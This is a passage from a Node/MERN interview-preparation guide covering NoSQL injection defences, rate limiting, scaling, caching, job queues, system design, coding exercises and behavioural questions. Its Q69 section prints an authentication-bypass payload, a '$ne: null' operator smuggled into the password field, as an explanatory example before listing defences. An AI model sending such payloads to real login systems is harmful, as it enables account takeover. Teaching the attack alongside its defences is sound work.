### Q69. NoSQL injection in MongoDB.

**The attack.**

Mongo accepts query operators (`$ne`, `$gt`, etc.) as objects. If you pass user input directly:

```js
// Vulnerable
const user = await User.findOne({
  username: req.body.username,
  password: req.body.password
});
```

Attacker sends:
```json
{ "username": "admin", "password": { "$ne": null } }
```

The query becomes `{username: 'admin', password: {$ne: null}}` — finds the admin user where password is anything not null. Auth bypassed.

**Defenses.**

**1. Type-check / coerce inputs.**

```js
if (typeof req.body.password !== 'string') return res.status(400).send('Bad input');
```

**2. Use a validator (zod / joi).**

```ts
const LoginSchema = z.object({
  username: z.string().min(1),
  password: z.string().min(1),
});
const { username, password } = LoginSchema.parse(req.body);
```

Zod refuses non-string values for string fields, blocking the attack.

**3. `express-mongo-sanitize`.**

Strips keys starting with `$` or containing `.` from `req.body`, `req.query`, `req.params`. Cheap broad defence.

```js
app.use(require('express-mongo-sanitize')());
```

**4. Use parameterised queries / ORM safely.**

Mongoose with proper schema types coerces inputs to expected types, mitigating most basic injections.

---

### Q70. Rate limiting strategies.

**Why rate limit.**

Protect against brute force (login), scraping, abuse, accidental DoS, and runaway costs (e.g., AI APIs).

**Strategies.**

**Fixed window.**

"Max N requests per minute." Reset at the top of each minute.

Simple. But allows bursts at boundaries — 100 requests at 12:59:59 then 100 more at 13:00:00 = 200 requests in 2 seconds.

**Sliding window.**

Track requests in the last 60 seconds (rolling). Smoother but more storage.

**Token bucket.**

Each user has a bucket of N tokens, refilled at R tokens/second. Each request consumes 1 token. Empty bucket → 429.

Allows bursts up to bucket size, then steady rate. Best for most APIs.

**Leaky bucket.**

Requests enter a queue, processed at fixed rate. Smooths bursts. Good for backend protection.

**Implementation.**

```js
const rateLimit = require('express-rate-limit');

app.use('/api/', rateLimit({
  windowMs: 60_000,
  max: 100,
  standardHeaders: true,    // RateLimit-* headers
  legacyHeaders: false,
}));

// Stricter for sensitive endpoints
app.post('/login', rateLimit({ windowMs: 15 * 60_000, max: 5 }));
```

**Multi-instance apps.**

`express-rate-limit` defaults to in-memory storage — each instance counts separately. Use Redis-backed for accuracy:

```js
const RedisStore = require('rate-limit-redis');
rateLimit({
  store: new RedisStore({ ... }),
  windowMs: 60_000,
  max: 100,
});
```

`rate-limiter-flexible` is more capable for production (multiple buckets, blocking strategies, lua scripts in Redis).

**Apply at multiple layers.**

- Per-IP for anonymous traffic.
- Per-user for authenticated traffic.
- Stricter on login, password reset, expensive endpoints.
- API gateway / load balancer level for the first line of defense.

---

## 9. Performance & Scaling

### Q71. How do you scale a Node.js application?

**The order matters: vertical first, then horizontal.**

**Vertical — make one instance faster.**

1. Profile. Find the slow queries, hot CPU, GC pauses.
2. Fix N+1s. Add indexes.
3. Add caching (Redis, in-memory LRU).
4. Pay for a beefier machine.

You can get very far on one big box. Don't skip this for premature distribution.

**Horizontal — multiple instances.**

1. Use `cluster` (or PM2) to use all CPU cores on one machine.
2. Multiple instances behind a load balancer (ALB, Nginx).
3. Make the app stateless:
   - Sessions in Redis, not in memory.
   - File uploads to S3, not local disk.
   - No "first request must hit same instance" assumption.
4. Sticky sessions only if you have stateful WebSockets; otherwise round-robin.

**Beyond a single service.**

- **Caching layers** — CDN for static + API responses, Redis for hot data.
- **Async processing** — push slow work to a job queue (BullMQ).
- **Database scaling** — read replicas, then sharding, then a separate analytical DB (ClickHouse, BigQuery).
- **Microservices** — only when team/domain boundaries warrant it. They add operational cost.

**The maturity curve.**

```
Monolith on one server
   ↓
Cluster mode + load balancer
   ↓
Stateless servers + Redis + queue + read replicas
   ↓
Service decomposition for scale or team boundaries
   ↓
Shard the database
```

Don't skip steps.

---

### Q72. What caching layers do you use?

**A typical stack, from edge to DB.**

| Layer | What it caches | Tools |
|---|---|---|
| **Browser** | Static assets, API responses | `Cache-Control`, `ETag` |
| **CDN** | Static + cacheable API | Cloudflare, CloudFront, Fastly |
| **Reverse proxy** | Hot pages, fragments | Nginx, Varnish |
| **App-level** | Hot DB queries, computed values, sessions | Redis, Memcached |
| **In-process** | Very hot small data | `lru-cache`, Map |
| **Database** | Materialised views, query cache | DB-specific |

**Cache patterns.**

**Cache-aside (lazy loading) — most common.**

```js
async function getUser(id) {
  const cached = await redis.get(`user:${id}`);
  if (cached) return JSON.parse(cached);
  
  const user = await db.users.findById(id);
  await redis.setex(`user:${id}`, 300, JSON.stringify(user));   // TTL 5 min
  return user;
}
```

**Write-through.** Write to cache and DB at the same time. Cache always fresh.

**Write-behind.** Write to cache; DB updated async later. Fast but risk losing data if cache dies.

**The hard part: cache invalidation.**

Phil Karlton: "There are only two hard things in computer science: cache invalidation and naming things."

Strategies:
- **TTL** — accept some staleness. Easy.
- **Explicit invalidation** — delete cache entry on update. Coordination cost.
- **Event-driven** — change streams or pub/sub trigger invalidation.
- **Versioned keys** — change the version on update; old keys age out (`user:42:v3`).

**Watch for cache stampede.**

When a hot key expires, a thousand requests miss simultaneously and all hit the DB. Mitigations:
- Probabilistic early expiration.
- Lock + single-flight refresh.
- Stale-while-revalidate.

---

### Q73. How do you handle long-running tasks (sending emails, generating reports)?

**Don't do them in the request handler.**

Long tasks block the API. Push them to a job queue and process them in worker processes.

```js
// Producer (in API)
const { Queue } = require('bullmq');
const emailQueue = new Queue('email', { connection: redis });

app.post('/signup', async (req, res) => {
  const user = await User.create(req.body);
  await emailQueue.add('welcome', { userId: user.id }, {
    attempts: 3,
    backoff: { type: 'exponential', delay: 1000 },
  });
  res.status(201).json({ userId: user.id });
});

// Worker (separate process)
const { Worker } = require('bullmq');
new Worker('email', async (job) => {
  if (job.name === 'welcome') {
    await sendWelcomeEmail(job.data.userId);
  }
}, { connection: redis });
```

**Why a queue.**

- API responds immediately — better UX.
- Failed jobs retry automatically with backoff.
- Workers scale independently of the API.
- Jobs survive restarts (durable in Redis).
- Crashes in worker don't affect the request path.

**BullMQ — the standard in Node.**

- Built on Redis.
- Job priorities, delayed jobs, repeatable jobs (cron-like).
- Excellent observability.
- Battle-tested.

**When to use which.**

| Tool | Use case |
|---|---|
| `setImmediate` / `setTimeout` | Fire-and-forget within same process (rarely correct in production) |
| BullMQ / Bee-Queue | Most async work — Redis-backed, single ecosystem |
| RabbitMQ | Complex routing, multi-language consumers |
| Kafka | High-throughput event streaming, audit logs, multi-consumer |
| AWS SQS / Google Pub/Sub | Cloud-native, less ops |

---

### Q74. How do you debug a slow API endpoint in production?

**A systematic process.**

**1. Reproduce the slowness.**

- Find a slow trace via APM (Datadog, New Relic, OpenTelemetry).
- Note: timestamp, request ID, user, payload, total duration.
- Try to reproduce in staging or by replaying the request.

**2. Identify the bottleneck.**

Look at the trace breakdown:
- DB query time.
- External API time.
- CPU/event loop time.
- Network/IO time.

A 5-second request might be 4.8s in one DB query — all the focus goes there.

**3. Drill into the suspect.**

**Database:**

```js
db.collection.find({ ... }).explain('executionStats')
```

Look for `COLLSCAN`, high `totalDocsExamined / nReturned` ratio, in-memory sorts.

**External calls:**

Log durations and outcomes. Add timeouts. If an external service is the bottleneck, you might need caching, retries with backoff, or a circuit breaker.

**CPU:**

Take a flamegraph:

```bash
npx clinic flame -- node app.js
# or
npx 0x -- node app.js
```

Identifies hot functions.

**GC:**

```bash
node --trace-gc app.js
```

Major GC pauses (100ms+) hurt latency. Often a sign of memory pressure or oversized objects.

**Connection pool exhaustion:**

If concurrent requests pile up but DB is fast, you might be out of pool connections. Check `db.serverStatus().connections` (Mongo) or pool metrics.

**4. Apply the fix.**

- Cache the result.
- Add a missing index.
- Batch / parallelise (`Promise.all`, DataLoader).
- Push the work async.
- Reduce payload size.
- Reduce queries.

**5. Verify with metrics.**

Don't trust your eyes. Look at p50, p95, p99 latency before and after.

---

### Q75. What's connection pooling and why does it matter?

**The problem.**

Opening a TCP connection (and TLS handshake) to a database is expensive — 1–10ms per connection. If every request opened a fresh connection, your latency floor would be terrible.

**The solution: a pool.**

Keep a fixed number of connections open and reuse them. When a request needs the DB, it grabs a connection from the pool, uses it, returns it.

```js
mongoose.connect(uri, {
  maxPoolSize: 100,        // default
  minPoolSize: 5,
});
```

**Sizing.**

Rule of thumb: `pool_size ≈ peak_concurrent_DB_operations`.

- Too small → requests wait for a connection (latency spikes).
- Too large → wastes resources (connections aren't free), and your DB has its own connection limit.

**Common mistake.**

Cranking up the pool when the DB is the bottleneck. More connections to a saturated DB just create more contention. The fix is: optimise the queries, add indexes, cache, or scale the DB — not raise the pool.

**Per-process or per-instance.**

Each Node process has its own pool. If you cluster to 4 workers and each has `maxPoolSize: 100`, that's 400 connections. Make sure your DB can handle the total.

**Connection limits.**

- MongoDB Atlas tiers have hard limits (M10: 1500 connections, etc.).
- PostgreSQL typically `max_connections = 100`. Use PgBouncer for many small Node processes.

---

## 10. System Design Scenarios

### Q76. Design a URL shortener.

**Clarify requirements first.** Always do this in interviews:

- Functional: shorten URLs, redirect, custom aliases?, analytics?
- Non-functional: 100M new URLs/year, 1B redirects/year, ~30 short URLs per second peak. Read-heavy (10:1 read/write).
- Constraints: max URL length, expiry?

**API design.**

```
POST /shorten         body: { long_url, custom_alias? }
                      response: { short_url, expires_at? }

GET /{short}          → 301 redirect to long URL

GET /api/stats/{short} → analytics
```

**Data model.**

```
{
  short: 'aB3xZ',         // unique
  long: 'https://...',
  user_id: '...',
  created_at: ...,
  expires_at: ...
}
```

Index on `short` (unique, B-tree).

**Generating the short code.**

Three options:

1. **Auto-increment + base62.** Each new URL gets ID 1, 2, 3..., encoded in base62 (`a-zA-Z0-9`). 7 chars = 62^7 = 3.5 trillion URLs. Compact and predictable, but exposes order.

2. **Hash long URL + collision check.** `sha256(url)` truncated to 7 chars. Same URL → same short. Need to handle collisions.

3. **Pre-allocated ranges per node.** Each app server gets a range (1M IDs). Avoids central counter bottleneck. Used at scale.

**Storage.**

- MongoDB or PostgreSQL — small write throughput, simple schema.
- Redis cache in front for hot redirects (most traffic is recent + popular URLs).

**Read path (the hot one).**

```
client → CDN → app server → Redis (hit?) → DB
```

Most redirects hit Redis. DB is for cold misses.

**Analytics.**

Don't write to OLTP DB on every redirect — that's 1B writes/year. Instead:

- Each redirect emits a click event to a queue (Kafka).
- A consumer aggregates into ClickHouse or similar columnar store.
- The analytics endpoint queries the columnar store.

**301 vs 302.**

- **301 (permanent)** — browser caches the redirect. Fewer hits to your service. Bad for analytics.
- **302 (temporary)** — every redirect hits your service. Accurate analytics. Higher load.

Most URL shorteners use 302 for analytics, accept the cost.

**Other things to mention.**

- Rate limiting per user.
- Spam/malware URL detection.
- CDN globally for low-latency redirects.
- Custom domain support (premium feature).

---

### Q77. Design a chat application (real-time messaging).

**Components.**

1. **WebSocket servers** — long-lived connections to clients.
2. **Pub/Sub** — distribute messages between WS servers.
3. **Message storage** — durable history.
4. **Presence service** — who's online.
5. **Push notification service** — for offline users.

**WebSockets.**

Use Socket.IO or `ws`. Each WS server holds tens of thousands of connections (limited by file descriptors, memory).

```
client ↔ WS server (Node) ← Redis pub/sub → other WS servers
```

**The fan-out problem.**

User A on server 1 sends a message to user B who's on server 2. How does it get there?

Two approaches:

**Sticky sessions** — same user always connects to the same server. Simple but doesn't help cross-user delivery.

**Pub/Sub** — when a server receives a message, publish to a Redis channel. All servers subscribe. The server with B's connection forwards to B.

```
A's server → publish('msg:userB', payload)
B's server → receives → sends over B's WS
```

**Message storage.**

```
{
  _id: ...,
  conversationId: ...,
  senderId: ...,
  content: ...,
  createdAt: ...
}
```

Index on `{conversationId, createdAt}`. Shard by `conversationId` if you grow huge.

**Delivery flow.**

1. Client A sends message to its WS server.
2. Server validates, saves to DB.
3. Server publishes to pub/sub by conversation ID.
4. All WS servers with subscribers to that conversation forward to clients.
5. For offline users, push notification via APNs/FCM.

**Read receipts.**

Per-user, per-conversation cursor: "last read message ID." Update on read. Other participants see "Read by X" when their cursor matches.

**Message ordering.**

Across nodes, clocks aren't synced perfectly. Use server-side timestamps + tiebreaker on `_id` for stable ordering.

**Reconnects.**

When a client reconnects, send "last seen message ID." Server replays everything since.

**Media.**

Don't send media through WebSockets. Issue presigned S3 URLs; client uploads directly; only the URL goes through chat.

**Scale.**

- WS server: ~50k connections per server. Scale horizontally.
- Redis cluster for pub/sub.
- DB sharded by conversation.

---

### Q78. Design a file upload service.

**Naive design (bad).**

```
client → API server → S3
```

Every byte passes through your API server. Bandwidth is your bottleneck. A 1GB upload ties up a worker for minutes.

**Better: presigned URLs.**

```
client → API: "I want to upload"
API → S3: "Generate presigned URL for /uploads/abc123"
API → client: { url, fields }
client → S3 directly
client → API: "Done, here's the key"
```

The API never sees the bytes. S3 handles the upload. Your API stays fast.

**Implementation sketch.**

```js
// API: issue upload URL
app.post('/uploads/init', async (req, res) => {
  const key = `uploads/${uuid()}`;
  const url = await s3.getSignedUrlPromise('putObject', {
    Bucket: 'mybucket',
    Key: key,
    Expires: 600,
    ContentType: req.body.contentType,
  });
  res.json({ uploadUrl: url, key });
});

// Client uploads directly to S3
await fetch(uploadUrl, { method: 'PUT', body: file });

// API: confirm upload
app.post('/uploads/complete', async (req, res) => {
  await db.files.create({ key: req.body.key, ownerId: req.user.id });
  // ... maybe trigger processing
});
```

**Large files: multipart upload.**

For files > 100MB, use S3 multipart upload:
- Client splits into chunks (5MB+ each).
- Upload chunks in parallel (resumable, retryable).
- API initiates and completes the multipart.

**Post-upload processing.**

Trigger processing via S3 events:

```
S3 upload event → SQS / SNS → Lambda or worker
```

Worker validates content (mime, virus scan), generates thumbnails, updates DB.

**Other concerns.**

- File size limits at signed-URL generation (`Content-Length-Range`).
- Authentication on upload init (only logged-in users).
- Lifecycle rules — delete unconfirmed uploads after 24h.
- CDN for downloads.
- Scan for malware (ClamAV in worker, or AWS Macie).

---

### Q79. How would you implement search in a MERN app?

**The progression of search complexity.**

**Stage 1: MongoDB `$text` search.**

```js
db.products.createIndex({ name: 'text', description: 'text' });
db.products.find({ $text: { $search: 'red shoes' } });
```

Built-in. Free. Fine for simple cases. But:
- One text index per collection.
- Limited relevance tuning.
- No faceting (filter by price ranges + colors + ...).
- No fuzzy matching, typo tolerance.

**Stage 2: MongoDB Atlas Search.**

If you're on Atlas, this is a Lucene-backed search service integrated with your DB. Big upgrade:
- Faceting, autocomplete, highlighting.
- Synonyms, fuzzy matching.
- Same query language as the rest of MongoDB.

**Stage 3: Dedicated search engine.**

When Atlas Search isn't enough, or you're not on Atlas:
- **Elasticsearch / OpenSearch** — most powerful, complex to operate.
- **Meilisearch** — easier to run, great for product search.
- **Typesense** — fast, simple, similar feature set.
- **Algolia** — hosted, expensive but excellent.

**Sync strategy.**

Your search index needs to stay in sync with your DB:

1. **Change streams** — listen to MongoDB changes, push to search index.
2. **Dual write** — app writes to both DB and search. Risk of inconsistency.
3. **Outbox pattern** — write to DB + outbox table in same transaction; a worker reads outbox and writes to search.

Change streams are the cleanest for MongoDB.

**The interview point.**

Articulate **when to upgrade** rather than reaching for Elasticsearch on day one. Most apps do fine on `$text` until they don't.

---

### Q80. How do you ensure data consistency between two services (e.g. orders and inventory)?

**The problem.**

When you place an order, you need to:
1. Create an order record.
2. Decrement inventory.
3. Charge the user.
4. Send a confirmation email.

Across multiple services, distributed transactions are usually impractical (XA/2PC has serious downsides). What do you do?

**Pattern 1: Saga.**

A sequence of local transactions. If any step fails, run compensating actions for the steps already done.

Two flavours:

**Choreography** — services react to each other's events.
- Order service: "OrderCreated" → inventory listens, decrements stock → "InventoryReserved" → payment listens, charges → "PaymentSucceeded" → notification listens, emails.
- If any step fails, emit a failure event; previous steps run compensations.

Decentralized, but hard to follow as the saga grows.

**Orchestration** — a central coordinator drives the saga.
- Order saga calls inventory, then payment, then notification.
- On failure, the orchestrator runs compensations explicitly.

Easier to reason about, but creates a coupling point.

**Pattern 2: Outbox.**

Solves the dual-write problem (writing to DB + publishing event reliably).

```
1. Begin transaction
2. Update business state (orders table)
3. Insert into outbox table (the event to publish)
4. Commit transaction
5. Separate process reads outbox, publishes to event bus, marks as sent
```

Either both succeed or neither. The publisher is at-least-once (consumer must dedupe).

**Pattern 3: Idempotent consumers.**

Every consumer must handle duplicate events safely. Use an event ID, store processed IDs, skip duplicates.

```js
async function handlePayment(event) {
  if (await processedEvents.exists(event.id)) return;
  // ... process
  await processedEvents.add(event.id);
}
```

**The mental shift.**

From "everything must be consistent now" (ACID transactions) to "everything will be consistent eventually" (eventual consistency with explicit reconciliation paths).

You also need:
- Monitoring for stuck sagas.
- Manual remediation tools for the cases that go wrong.
- Idempotent APIs throughout.

---

## 11. Coding Problems

Interviewers at 4 yrs expect: clean code, edge cases, complexity analysis stated upfront.

### Q81. Implement debounce.

**The idea.**

Debounce: "wait until things stop happening, then fire." Used for search input — don't fire a request on every keystroke; wait until the user pauses.

```js
function debounce(fn, wait) {
  let timer;
  return function (...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), wait);
  };
}

// Usage
const onSearch = debounce((q) => api.search(q), 300);
input.addEventListener('input', e => onSearch(e.target.value));
```

**Variations to mention.**

- **Leading edge** — fire on the first call, ignore subsequent until quiet.
- **Trailing edge (above)** — fire after the quiet period.
- **Both edges** — fire on first and last.
- **`cancel()` method** — clear the pending call.

**Time complexity:** O(1) per call.

---

### Q82. Implement throttle.

**The idea.**

Throttle: "fire at most once every N ms, no matter how often you're called." Used for scroll/resize handlers.

```js
function throttle(fn, wait) {
  let last = 0;
  let timer;
  return function (...args) {
    const now = Date.now();
    const remaining = wait - (now - last);
    if (remaining <= 0) {
      clearTimeout(timer);
      timer = null;
      last = now;
      fn.apply(this, args);
    } else if (!timer) {
      timer = setTimeout(() => {
        last = Date.now();
        timer = null;
        fn.apply(this, args);
      }, remaining);
    }
  };
}
```

**Throttle vs debounce.**

- Debounce: wait for silence.
- Throttle: rate-limit, but always make progress.

For a scroll handler that updates a UI: throttle. For a search: debounce.

---

### Q83. Deep clone an object.

**The naive approach.**

```js
JSON.parse(JSON.stringify(obj))
```

Works for plain JSON. Fails for:
- `Date` (becomes string).
- `Map`, `Set`, `RegExp`.
- Functions (silently dropped).
- Cycles (infinite loop).
- `undefined` (dropped).

**A proper deep clone.**

```js
function deepClone(value, seen = new WeakMap()) {
  if (value === null || typeof value !== 'object') return value;
  if (seen.has(value)) return seen.get(value);   // handle cycles
  
  if (value instanceof Date) return new Date(value);
  if (value instanceof RegExp) return new RegExp(value);
  
  if (value instanceof Map) {
    const out = new Map();
    seen.set(value, out);
    for (const [k, v] of value) out.set(deepClone(k, seen), deepClone(v, seen));
    return out;
  }
  
  if (value instanceof Set) {
    const out = new Set();
    seen.set(value, out);
    for (const v of value) out.add(deepClone(v, seen));
    return out;
  }
  
  if (Array.isArray(value)) {
    const out = [];
    seen.set(value, out);
    for (const v of value) out.push(deepClone(v, seen));
    return out;
  }
  
  const out = {};
  seen.set(value, out);
  for (const k of Reflect.ownKeys(value)) {
    out[k] = deepClone(value[k], seen);
  }
  return out;
}
```

**Modern alternative.**

```js
const clone = structuredClone(obj);   // built-in in Node 17+, modern browsers
```

Handles Date, Map, Set, ArrayBuffer, cycles. Doesn't handle functions.

---

### Q84. Implement `Promise.all` from scratch.

```js
function promiseAll(promises) {
  return new Promise((resolve, reject) => {
    const results = [];
    let remaining = promises.length;
    
    if (remaining === 0) return resolve([]);
    
    promises.forEach((p, i) => {
      Promise.resolve(p).then(
        (value) => {
          results[i] = value;
          if (--remaining === 0) resolve(results);
        },
        reject   // first rejection wins
      );
    });
  });
}
```

**Key points to mention.**

- `Promise.resolve(p)` handles the case where `p` isn't a promise (a plain value).
- Results preserve input order, even if promises resolve out of order.
- First rejection rejects the whole thing.
- Empty array resolves immediately to `[]`.

---

### Q85. Flatten a nested array.

```js
function flatten(arr, depth = Infinity) {
  return arr.reduce((acc, val) => {
    if (Array.isArray(val) && depth > 0) {
      acc.push(...flatten(val, depth - 1));
    } else {
      acc.push(val);
    }
    return acc;
  }, []);
}

// Or built-in:
arr.flat(Infinity);
```

**Mention complexity.** O(n) where n is total elements (including nested).

**Iterative version (avoids stack overflow on deeply nested):**

```js
function flatten(arr) {
  const result = [];
  const stack = [...arr];
  while (stack.length) {
    const next = stack.pop();
    if (Array.isArray(next)) stack.push(...next);
    else result.push(next);
  }
  return result.reverse();   // because we pop from end
}
```

---

### Q86. LRU Cache.

**The problem.** Implement a cache with a fixed capacity. When full, evict the least recently used item. Both `get` and `put` should be O(1).

**The trick.** JavaScript's `Map` preserves insertion order. We can leverage this:

```js
class LRUCache {
  constructor(capacity) {
    this.capacity = capacity;
    this.map = new Map();
  }
  
  get(key) {
    if (!this.map.has(key)) return -1;
    const value = this.map.get(key);
    this.map.delete(key);
    this.map.set(key, value);   // re-insert → moves to end (most recent)
    return value;
  }
  
  put(key, value) {
    if (this.map.has(key)) {
      this.map.delete(key);
    } else if (this.map.size >= this.capacity) {
      // delete the oldest — first key in iteration order
      const oldest = this.map.keys().next().value;
      this.map.delete(oldest);
    }
    this.map.set(key, value);
  }
}
```

**Why O(1)?** `Map` operations (set, get, delete, `keys().next()`) are all O(1).

**Classic implementation (without Map).** Doubly-linked list + hash map. The DLL tracks order; the map gives O(1) lookup. Same complexity, more code.

---

### Q87. Find duplicates in an array of objects by a key.

```js
function findDuplicates(arr, key) {
  const seen = new Map();
  const dups = [];
  
  for (const item of arr) {
    const k = item[key];
    if (seen.has(k)) {
      dups.push(item);
    } else {
      seen.set(k, true);
    }
  }
  
  return dups;
}

// Usage
findDuplicates([{id:1},{id:2},{id:1}], 'id');   // [{id:1}]
```

**O(n) time, O(n) space.**

**Variations to mention:**
- Return all instances of duplicates (including the first).
- Group duplicates: `{key: [items]}`.
- Composite keys (multiple fields).

---

### Q88. Build a simple event emitter.

```js
class EventEmitter {
  constructor() {
    this.listeners = new Map();
  }
  
  on(event, fn) {
    if (!this.listeners.has(event)) this.listeners.set(event, new Set());
    this.listeners.get(event).add(fn);
    return () => this.off(event, fn);   // unsubscribe handle
  }
  
  off(event, fn) {
    this.listeners.get(event)?.delete(fn);
  }
  
  emit(event, ...args) {
    this.listeners.get(event)?.forEach(fn => {
      try { fn(...args); }
      catch (err) { console.error('listener error:', err); }
    });
  }
  
  once(event, fn) {
    const wrap = (...args) => {
      this.off(event, wrap);
      fn(...args);
    };
    return this.on(event, wrap);
  }
}
```

**Things to mention.**

- Using a `Set` (not array) for O(1) remove and natural dedup.
- Wrapping listeners in try/catch — one bad listener shouldn't break others.
- `on` returns a cleanup function — common pattern.
- `once` wraps the listener to auto-remove.

---

## 12. Behavioral Questions

These matter as much as the technical ones at 4 yrs. Use the **STAR** method (Situation, Task, Action, Result). Have 3–4 stories ready that you can adapt to different questions.

### Q89. Tell me about a difficult bug you fixed.

**Pick a real, specific story.** Vague answers ("we had a memory leak and I fixed it") signal fluff.

**Structure:**
1. **Symptoms** — what was broken, when, who noticed.
2. **Hypotheses** — what you initially suspected and why.
3. **Tools** — what you used to investigate (logs, profiler, debugger).
4. **Root cause** — the actual problem.
5. **Fix** — what you changed.
6. **Prevention** — tests, monitoring, docs you added.

**Bonus signals:**
- It was someone else's code (you didn't blame).
- You used an unfamiliar tool to debug (initiative).
- The root cause wasn't where it looked (you stayed methodical).
- You added monitoring/tests so it can't recur (long-term thinking).

---

### Q90. Tell me about a time you disagreed with a teammate.

The interviewer is checking: can you disagree on technical merits without making it personal?

**Structure:**
1. The disagreement (technical, not personal).
2. How you understood their position — show you listened.
3. The data/reasoning you brought.
4. The outcome — and what you did if they turned out to be right.

**Avoid:**
- "We disagreed and I won and they were wrong."
- Anything that paints the other person as incompetent.

**A great answer ends with:** "It turned out their concern was valid — we hit X edge case I hadn't considered." Shows you can be wrong and still walk away productive.

---

### Q91. A time you missed a deadline.

**Honesty wins.** Everyone has missed a deadline. The question is whether you handled it well.

**Structure:**
- What was the project and the deadline.
- What you did when you saw it slipping (escalated early? scoped down? worked weekends?).
- What you missed and why.
- What you learned about estimation/planning.
- How you've changed your behaviour since.

**Red flags to avoid:**
- Blaming others.
- "I never miss deadlines" (interviewer thinks: this person hasn't worked on hard things).

---

### Q92. A time you mentored a junior.

At 4 yrs, you'll often be the senior on a small team. Show you can multiply others' output, not just your own.

**Specifics work best:**
- A code review pattern you use to teach without crushing.
- A debugging session where you let them drive while guiding.
- A doc/runbook you wrote that helped others.
- A 1:1 conversation that helped someone past a stuck point.

**Avoid:**
- "I always help juniors" — too vague.
- Stories that center you over them.

---

### Q93. Why are you leaving your current job?

**Frame as moving toward something, not away.**

Good: "I want to work on larger-scale distributed systems, and your team owns exactly that."

Bad: "My manager is bad and the codebase is a mess."

Even if true, badmouthing is a red flag — interviewers extrapolate to how you'd talk about them.

---

### Q94. Where do you see yourself in 3 years?

Show you've thought about it. Pick one of:
- **Deeper specialist** — architecture, performance, security, distributed systems.
- **Broader** — full stack lead, eng manager.
- **Domain-focused** — fintech, healthcare, ML platform.

Connect it to **why this company** — they want to know they're not a stepping stone but somewhere you can grow into that role.

---

### Q95. Do you have any questions for us?

**Always have 3+ ready.** "No, I think you covered everything" is a missed opportunity.

Good ones for the 4-yr level:

- "What does the path from senior to staff look like here? What separates the two?"
- "Walk me through what code review and deployment look like. How long from PR open to prod?"
- "What's the team's biggest technical debt right now?"
- "How is on-call structured? What does a typical week on-call look like?"
- "If I joined and was crushing it for six months, what would that look like?"
- "What's something you wish was different about engineering here?"

The last one is especially good — it shows you want a real picture, not a sales pitch.

---

## Quick Reference: Common Pitfalls in Interviews

- **Don't say "yes" to things you haven't used.** Say "I've read about it" or "I've used X which is similar." Interviewers can smell bluffing within two follow-ups.
- **Talk through trade-offs, not just answers.** "I'd use Redux for this app because..." is better than "I'd use Redux."
- **Mention complexity (time + space) on coding questions before they ask.**
- **For system design, always start with requirements clarification** (functional + non-functional, scale, read/write ratio).
- **Tests, observability, deployment, on-call** — sprinkle these into your answers; they signal seniority.
- **"I don't know, but I'd find out by..."** beats fabricated confidence every time.

---

## Final Study Plan (2 weeks before interview)

| Day | Focus |
|---|---|
| 1–2 | JS deep dive (event loop, async, closures), TS basics |
| 3–4 | Node.js internals, streams, clustering |
| 5 | Express patterns, error handling, middleware |
| 6–7 | MongoDB indexing, aggregation, transactions |
| 8–9 | React (hooks, perf) OR Angular (RxJS, change detection) |
| 10 | REST/GraphQL, security |
| 11 | System design — practice 2 problems out loud |
| 12 | Coding problems on a whiteboard / plain text |
| 13 | Behavioral stories (write them down) |
| 14 | Mock interview, rest |

Good luck!
